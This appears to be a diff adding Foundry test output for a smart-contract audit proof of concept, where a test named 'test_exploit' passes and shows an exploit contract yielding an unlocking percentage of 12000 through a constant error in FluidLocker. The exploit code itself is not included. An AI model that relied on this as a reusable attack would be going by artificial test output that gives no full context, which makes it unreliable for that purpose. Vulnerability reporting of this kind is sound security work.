@@ -1,0 +1,19 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/43733-h-2-fluidlocker-getunlockingpercentage-uses-540-instead-of-5_exp.sol:PoC_43733
+[PASS] test_exploit() (gas: 202327)
+Traces:
+  [202327] PoC_43733::test_exploit()
+    ├─ [123569] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 617 bytes of code
+    ├─ [46000] Exploit::run()
+    │   ├─ emit Proof(percentage: 12000 [1.2e4])
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 12000
+    │   │   @ 1: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 244.04µs (85.46µs CPU time)
+
+Ran 1 test suite in 5.60ms (244.04µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
